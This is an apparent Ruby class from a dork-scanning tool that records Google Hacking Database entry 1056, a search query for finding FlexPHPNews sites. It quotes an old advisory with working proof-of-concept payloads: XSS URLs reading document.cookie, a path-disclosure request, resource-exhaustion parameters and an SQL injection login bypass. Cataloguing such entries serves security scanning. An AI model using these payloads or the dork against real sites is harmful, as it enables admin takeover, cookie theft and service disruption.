module Dorks
   class Dork1056 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1056",
            ghdb_url: "https://www.exploit-db.com/ghdb/1056",
            severity: "3",
            category: "vulnerable_files",
            publish_date: "2005-08-07",
            author: "anonymous",
            dork: <<~EDORK,
"Powered by FlexPHPNews" inurl:news | inurl:press
EDORK
            description: <<~EDESC
24/07/2005 2.38.13Flex PHPNews 0.0.4 login bypass/ sql injection, cross site scripting & resource consumption poc exploitsoftware:author site:http://www.china-on-site.com/flexphpnews/downloads.phpxss / cookie disclosure:http://[target]/[path]/index.php?front_indextitle=alert(document.cookie)http://[target]/[path]/index.php?front_searchsubmit="&gt;alert(document.cookie)http://[target]/[path]/index.php?front_latestnews="&gt;alert(document.cookie)http://[target]/[path]/news.php?newsid="&gt;alert(document.cookie)http://[target]/[path]/news.php?front_rating="&gt;alert(document.cookie)http://[target]/[path]/news.php?salt="&gt;alert(document.cookie)http://[target]/[path]/news.php?front_letmerateit="&gt;alert(document.cookie)http://[target]/[path]/news.php?front_ratebest="&gt;alert(document.cookie)http://[target]/[path]/news.php?front_ratesubmit="&gt;alert(document.cookie)http://[target]/[path]/news.php?front_searchsubmit="&gt;alert(document.cookie)http://[target]/[path]/search.php?front_searchresult=alert(document.cookie)http://[target]/[path]/search.php?front_searchsubmit="&gt;alert(document.cookie)http://[target]/[path]/catalog.php?front_searchsubmit="&gt;alert(document.cookie)http://[target]/[path]/catalog.php?front_latestnews="&gt;alert(document.cookie)http://[target]/[path]/catalog.php?catalogid="&gt;alert(document.cookie)path disclosure:http://[target]/[path]/admin/usercheck.php?logincheck=%00denial of service / resources consumption:http://[target]/[path]/news.php?prenumber=99999999999999999999999999999999http://[target]/[path]/news.php?nextnumber=99999999999999999999999999999999($prenumber and $nextnumber are uninitialized final values of a loop...) sql injection / bypass authentication:go to login page:http://[target]/[path]/admin/(usually admin if not changed)login as user: ' OR 'a'='aand pass : ' OR 'a'='a boom! you're admin ...the problem is in usercheck.php at line 5:$sql = "select username from newsadmin where username='$checkuser' and password='$checkpass'";you can post always true statements, like 'a'='a'solution: replace $checkuser and $checkpass vars with your username and pass, by the moment
EDESC
         })

      end
   end
end
